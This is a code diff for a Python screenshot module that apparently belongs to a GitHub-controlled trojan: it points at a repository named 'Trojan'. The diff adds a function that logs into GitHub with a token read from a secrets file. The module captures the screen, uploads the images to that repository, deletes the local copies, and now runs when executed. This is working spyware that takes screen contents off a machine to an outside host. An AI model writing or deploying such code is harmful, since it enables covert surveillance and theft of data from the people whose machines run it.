@@ -2,6 +2,15 @@ import pyautogui
 import os
 import base64
 from datetime import datetime
+import github3  # Make sure this is imported
+
+# Define the github_connect function
+def github_connect():
+    with open('secret.txt') as f:
+        token = f.read().strip()
+    user = 'hacksparkdev'
+    sess = github3.login(token=token)
+    return sess.repository(user, 'Trojan')
 
 def take_screenshot():
     # Generate a unique filename based on the current timestamp
@@ -28,7 +37,8 @@ def send_screenshot_to_github(filename, repo, data_path):
         print(f"Error uploading screenshot to GitHub: {e}")
 
 def run():
-    repo = github_connect()  # Assuming you have a function to connect to GitHub
+    # Ensure github_connect is called before it's used
+    repo = github_connect()  
     data_path = 'data/screenshots/'  # Adjust this path based on your setup
     
     # Take a screenshot
@@ -40,4 +50,8 @@ def run():
     # Clean up by deleting the local screenshot file after uploading
     os.remove(screenshot_file)
     print("Screenshot module executed")
+
+# Execute the run function when the module is executed
+if __name__ == "__main__":
+    run()
 
